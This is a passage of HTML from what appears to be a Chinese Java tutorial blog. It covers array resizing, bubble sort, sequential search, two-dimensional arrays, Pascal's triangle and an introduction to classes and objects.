class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>arrnew[i]=arr[i];<br>&#125;<br>arrnew[arrnew.length-<span class="hljs-number">1</span>]=<span class="hljs-number">4</span>;<br>arr = arrnew; <span class="hljs-comment">//原数组指向新数组</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>System.out.print(arrnew[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>&#125;&#125;<br></code></pre></td></tr></table></figure><p>改进版，询问是否继续添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arrayadd</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-keyword">do</span>&#123;<br><span class="hljs-type">int</span>[] arrnew = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length+<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>arrnew[i]=arr[i];<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;输入添加的元素：&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">addNum</span> <span class="hljs-operator">=</span> myscanner.nextInt();<br><br>arrnew[arrnew.length-<span class="hljs-number">1</span>]=addNum;<br>arr=arrnew;<br>System.out.println(<span class="hljs-string">&quot;当前数组为&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>System.out.print(arr[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;是否继续添加？y/n&quot;</span>);<br><span class="hljs-type">char</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> myscanner.next().charAt(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (key==<span class="hljs-string">&#x27;y&#x27;</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key==<span class="hljs-string">&#x27;n&#x27;</span>)&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;输入有误。&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>);<br>System.out.println(<span class="hljs-string">&quot;你退出了添加。&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考上述实现数据缩减：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">arrayreduce</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">mysc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-keyword">do</span>&#123;<br><span class="hljs-type">int</span>[] newarr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arr.length-<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;newarr.length;i++) &#123;<br>newarr[i]=arr[i];<br>&#125;<br>arr = newarr;<br>System.out.println(<span class="hljs-string">&quot;是否继续进行缩减？y/n&quot;</span>);<br><span class="hljs-type">char</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> mysc.next().charAt(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (answer==<span class="hljs-string">&#x27;y&#x27;</span>) &#123;<br><span class="hljs-keyword">if</span> (arr.length==<span class="hljs-number">1</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;不能再缩减。&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (answer==<span class="hljs-string">&#x27;n&#x27;</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;输入错误！&quot;</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>System.out.print(arr[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-排序"><a href="#2-排序" class="headerlink" title="2.排序"></a>2.排序</h2><p>排序是将多个数据，依指定的顺序进行排列的过程。</p><p><strong>分类：</strong></p><p><strong>1.内部排序</strong>：将需要处理的<strong>所有数据加载</strong>到内部存储器中进行排序，包括（交换式排序法、选择式排序法和插入式排序法)；</p><p><strong>2.外部排序</strong>：数据量过大，无法全部加载到内存中，需要借助外部存储进行排序，包括（合并排序法和直接合并排序法）</p><h3 id="冒泡排序法"><a href="#冒泡排序法" class="headerlink" title="冒泡排序法"></a>冒泡排序法</h3><blockquote><p>冒泡排序（Bubble Sorting）的基本思想是：通过对待排序序列从后向前（从下标较大的元素开始），依次比较相邻元素的值，若发现逆序则交换，使值较大的元素逐渐从前移向后部，就象水底下的气泡一样逐渐向上冒。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bubblesort</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span> arr[]=&#123;<span class="hljs-number">24</span>,<span class="hljs-number">69</span>,<span class="hljs-number">80</span>,<span class="hljs-number">57</span>,<span class="hljs-number">13</span>&#125;;<br><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<span class="hljs-comment">//辅助交换</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length-<span class="hljs-number">1</span>;i++) &#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arr.length-<span class="hljs-number">1</span>-i;j++)&#123;<br>a=arr[j];<br><span class="hljs-keyword">if</span> (a&gt;arr[j+<span class="hljs-number">1</span>]) &#123;<br>arr[j]=arr[j+<span class="hljs-number">1</span>];<br>arr[j+<span class="hljs-number">1</span>]=a;<br>&#125;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;\n第&quot;</span>+(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;次循环&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;count&lt;arr.length;count++) &#123;<br>System.out.print(arr[count]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220517020245465.png" alt="image-20220517020245465"></p><p>还可以再优化，如果当前循环的换数次数为0，则可提前终止循环。</p><h2 id="3-查找"><a href="#3-查找" class="headerlink" title="3.查找"></a>3.查找</h2><h3 id="1）顺序查找"><a href="#1）顺序查找" class="headerlink" title="1）顺序查找"></a>1）顺序查找</h3><p>例题：有一个数列：白眉鹰王、金毛狮王、紫衫龙王、青翼蝠王猜数游戏：从键盘中任意输入一个名称，判断数列中是否包含此名称</p><p>要求：如果找到了，就提示找到，并给出下标值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">seqsearch</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>String[] names = &#123;<span class="hljs-string">&quot;白眉鹰王&quot;</span>,<span class="hljs-string">&quot;金毛狮王&quot;</span>,<span class="hljs-string">&quot;紫衫龙王&quot;</span>,<span class="hljs-string">&quot;青翼蝠王&quot;</span>&#125;;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myscanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>System.out.println(<span class="hljs-string">&quot;请输入名字：&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">findName</span> <span class="hljs-operator">=</span> myscanner.next();<br><span class="hljs-type">int</span> index=-<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;names.length;i++ ) &#123;<br><span class="hljs-keyword">if</span> (findName.equals(names[i])) &#123;<br>System.out.println(<span class="hljs-string">&quot;恭喜你找到&quot;</span>+findName);<br>System.out.println(<span class="hljs-string">&quot;下标为=&quot;</span>+i);<br>index = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(index==-<span class="hljs-number">1</span>)&#123;<br>System.out.println(<span class="hljs-string">&quot;没有找到&quot;</span>+findName);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2）二分查找【详见于算法】"><a href="#2）二分查找【详见于算法】" class="headerlink" title="2）二分查找【详见于算法】"></a>2）二分查找【详见于算法】</h3><h2 id="4-多维数组——二维数组"><a href="#4-多维数组——二维数组" class="headerlink" title="4.多维数组——二维数组"></a>4.多维数组——二维数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">twoDimensionalArray</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span>[][] arr=&#123;&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,&#123;<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;,&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;&#125;;<br><span class="hljs-comment">//输出2维图形</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arr[i].length;j++) &#123;<br>System.out.print(arr[i][j]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220518022158615.png" alt="image-20220518022158615" style="zoom:50%;" /><h3 id="使用方式1-动态初始化-1"><a href="#使用方式1-动态初始化-1" class="headerlink" title="使用方式1-动态初始化"></a>使用方式1-动态初始化</h3><p>语法：类型［］［］数组名＝new 类型［大小］［大小］ </p><p>比如： int a［］［］＝new int［2］［3］</p><p>行-列</p><h3 id="使用方式2-动态初始化-1"><a href="#使用方式2-动态初始化-1" class="headerlink" title="使用方式2-动态初始化"></a>使用方式2-动态初始化</h3><p>先声明：类型  数组名［］［］;（默认值为0）</p><p>再定义：数组名＝new 类型［大小］［大小］ </p><h3 id="使用方式3-列数不确定"><a href="#使用方式3-列数不确定" class="headerlink" title="使用方式3-列数不确定"></a>使用方式3-列数不确定</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">twoDimensionalArray2</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>arr[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[i+<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arr[i].length;j++) &#123;<br>arr[i][j] = i+<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;arr元素&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arr[i].length;j++) &#123;<br>System.out.print(arr[i][j]+<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220518025904324.png" alt="image-20220518025904324"></p><h3 id="使用方式4-静态初始化"><a href="#使用方式4-静态初始化" class="headerlink" title="使用方式4-静态初始化"></a>使用方式4-静态初始化</h3><p><code>类型［］［］数组名＝&#123;&#123;值1,值2...&#125;,&#123;值1,值2...&#125;,&#123;值1,值2..&#125;&#125;</code></p><h3 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220519015919884.png" alt="image-20220519015919884"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">yanghui</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//规律：除了第一个和最后一个，数值都是上一行的前一列和这一列相加</span><br><span class="hljs-type">int</span>[][] arr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>][]; <span class="hljs-comment">//列数不确定</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>arr[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[i+<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arr[i].length;j++ ) &#123;<br><span class="hljs-keyword">if</span> (j==<span class="hljs-number">0</span>||j==arr[i].length-<span class="hljs-number">1</span>) &#123;<br>arr[i][j]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>arr[i][j] = arr[i-<span class="hljs-number">1</span>][j]+arr[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>&#125;<br>&#125;<br><span class="hljs-comment">//输出</span><br>System.out.println(<span class="hljs-string">&quot;杨辉三角&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arr[i].length;j++) &#123;<br>System.out.print(arr[i][j]+<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br>System.out.println();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>int[] x,y[];</strong></p><p>x是int类型的一维数组，y是int类型的二维数组</p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>1.随机生成10个整数（1_100的范围）保存到数组，并倒序打印以及求平均值、求最大值和最大值的下标、并查找里面是否有8</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test1</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>arr[i] = (<span class="hljs-type">int</span>)(Math.random()*<span class="hljs-number">100</span>)+<span class="hljs-number">1</span>;<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;====正序====&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br>System.out.print(arr[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;====倒序====&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> arr.length-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--) &#123;<br>System.out.print(arr[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//平均值、最大值和最大值的下标</span><br><span class="hljs-type">double</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br><span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br><span class="hljs-type">int</span> <span class="hljs-variable">maxIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;arr.length;i++) &#123;<br><span class="hljs-keyword">if</span> (max&lt;arr[i]) &#123;<br>max = arr[i];<br>maxIndex = i;<br>&#125;<br>sum+=arr[i];<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;max=&quot;</span>+max+<span class="hljs-string">&quot; maxIndex=&quot;</span>+maxIndex+<span class="hljs-string">&quot; average=&quot;</span>+(sum/arr.length));<br><br><span class="hljs-comment">//查找数组中是否有8</span><br><span class="hljs-type">int</span> <span class="hljs-variable">findnum</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">numIndex</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arr.length;i++) &#123;<br><span class="hljs-keyword">if</span> (arr[i] == findnum) &#123;<br>numIndex = i;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (numIndex == -<span class="hljs-number">1</span>) &#123;<br>System.out.println(<span class="hljs-string">&quot;没有找到该数&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="——面向对象编程——"><a href="#——面向对象编程——" class="headerlink" title="——面向对象编程——"></a>——面向对象编程——</h1><p>面向对象编程：<strong>封装、继承和多态</strong>。</p><h1 id="章节六"><a href="#章节六" class="headerlink" title="章节六"></a>章节六</h1><h2 id="1-类与对象"><a href="#1-类与对象" class="headerlink" title="1.类与对象"></a>1.类与对象</h2><blockquote><p>张老太养了两只猫猫：一只名字叫小白，今年3岁，白色。<br>还有一只叫小花，今年100岁，花色。请编写一个程序，当用户输入小猫的名字时，就显示该猫的名字，年龄，颜色。如果用户输入的小猫名错误，<br>则显示 张老太没有这只猫猫。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//纯变量实现=&gt;不利于数据的管理</span><br><span class="hljs-comment">//第一只猫</span><br><span class="hljs-type">String</span> <span class="hljs-variable">cat1name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;小白&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">cat1age</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">cat1color</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;白色&quot;</span>;<br><span class="hljs-comment">//第二只猫</span><br><span class="hljs-type">String</span> <span class="hljs-variable">cat2name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;小花&quot;</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">cat2age</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">cat2color</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;花色&quot;</span>;<br><br><span class="hljs-comment">//数组=&gt;（1）数据类型提现不出来（2）只能通过[下标]获取信息，造成变量名字和内容</span><br><span class="hljs-comment">//的对应关系不明确 （3）不能体现猫的行为</span><br>String[] cat1 = &#123;<span class="hljs-string">&quot;小白&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;白色&quot;</span>&#125;;<br>String[] cat2 = &#123;<span class="hljs-string">&quot;小花&quot;</span>,<span class="hljs-string">&quot;100&quot;</span>,<span class="hljs-string">&quot;白色&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p>变量和数组不能很好的解决问题，引出类和对象。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220520104616487.png" alt="image-20220520104616487"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220520104756710.png" alt="image-20220520104756710"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span 